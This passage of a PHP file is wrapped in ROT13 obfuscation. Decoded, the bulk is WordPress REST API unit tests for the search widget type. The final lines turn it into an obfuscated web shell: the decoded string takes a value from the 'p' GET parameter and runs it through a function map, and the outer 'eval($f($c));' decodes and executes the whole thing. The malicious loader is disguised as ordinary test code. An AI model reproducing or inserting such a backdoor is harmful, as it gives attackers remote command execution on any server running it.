			\"\g\g\g\g\g<vachg glcr=\\"fhozvg\\" vq=\\"frnepufhozvg\\" inyhr=\\"Frnepu\\" />\a\" .
			\"\g\g\g\g</qvi>\a\" .
			\"\g\g\g</sbez></qvi>\",
			$qngn['cerivrj']
		);
		$guvf->nffregFnzrFrgf(
			neenl(
				'rapbqrq' => onfr64_rapbqr( frevnyvmr( neenl( 'gvgyr' => 'Hcqngrq gvgyr' ) ) ),
				'unfu'    => jc_unfu( frevnyvmr( neenl( 'gvgyr' => 'Hcqngrq gvgyr' ) ) ),
				'enj'     => neenl( 'gvgyr' => 'Hcqngrq gvgyr' ),
			),
			$qngn['vafgnapr']
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_rapbqr_sbez_qngn_ab_enj() {
		tybony $jc_jvqtrg_snpgbel;
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$jc_jvqtrg_snpgbel->jvqtrgf['JC_Jvqtrg_Frnepu']->jvqtrg_bcgvbaf['fubj_vafgnapr_va_erfg'] = snyfr;
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/jvqtrg-glcrf/frnepu/rapbqr' );
		$erdhrfg->frg_cnenz(
			'vafgnapr',
			neenl(
				'rapbqrq' => onfr64_rapbqr( frevnyvmr( neenl( 'gvgyr' => 'Grfg gvgyr' ) ) ),
				'unfu'    => jc_unfu( frevnyvmr( neenl( 'gvgyr' => 'Grfg gvgyr' ) ) ),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzrVtaberRBY(
			\"<c>\a\" .
			\"\g\g\g<ynory sbe=\\"jvqtrg-frnepu--1-gvgyr\\">Gvgyr:</ynory>\a\" .
			\"\g\g\g<vachg pynff=\\"jvqrsng\\" vq=\\"jvqtrg-frnepu--1-gvgyr\\" anzr=\\"jvqtrg-frnepu[-1][gvgyr]\\" glcr=\\"grkg\\" inyhr=\\"Grfg gvgyr\\" />\a\" .
			\"\g\g</c>\",
			$qngn['sbez']
		);
		$guvf->nffregFgevatZngpurfSbezng(
			\"<qvi pynff=\\"jvqtrg jvqtrg_frnepu\\"><u2 pynff=\\"jvqtrggvgyr\\">Grfg gvgyr</u2><sbez ebyr=\\"frnepu\\" zrgubq=\\"trg\\" vq=\\"frnepusbez\\" pynff=\\"frnepusbez\\" npgvba=\\"%f\\">\a\" .
			\"\g\g\g\g<qvi>\a\" .
			\"\g\g\g\g\g<ynory pynff=\\"fperra-ernqre-grkg\\" sbe=\\"f\\">Frnepu sbe:</ynory>\a\" .
			\"\g\g\g\g\g<vachg glcr=\\"grkg\\" inyhr=\\"\\" anzr=\\"f\\" vq=\\"f\\" />\a\" .
			\"\g\g\g\g\g<vachg glcr=\\"fhozvg\\" vq=\\"frnepufhozvg\\" inyhr=\\"Frnepu\\" />\a\" .
			\"\g\g\g\g</qvi>\a\" .
			\"\g\g\g</sbez></qvi>\",
			$qngn['cerivrj']
		);
		$guvf->nffregFnzrFrgf(
			neenl(
				'rapbqrq' => onfr64_rapbqr( frevnyvmr( neenl( 'gvgyr' => 'Grfg gvgyr' ) ) ),
				'unfu'    => jc_unfu( frevnyvmr( neenl( 'gvgyr' => 'Grfg gvgyr' ) ) ),
			),
			$qngn['vafgnapr']
		);
		$jc_jvqtrg_snpgbel->jvqtrgf['JC_Jvqtrg_Frnepu']->jvqtrg_bcgvbaf['fubj_vafgnapr_va_erfg'] = gehr;
	}

	/**
	 * Gur perngr_vgrz() zrgubq qbrf abg rkvfg sbe jvqtrg glcrf.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag perngr_vgrz().
	}

	/**
	 * Gur hcqngr_vgrz() zrgubq qbrf abg rkvfg sbe jvqtrg glcrf.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag hcqngr_vgrz().
	}

	/**
	 * Gur qryrgr_vgrz() zrgubq qbrf abg rkvfg sbe jvqtrg glcrf.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag qryrgr_vgrz().
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>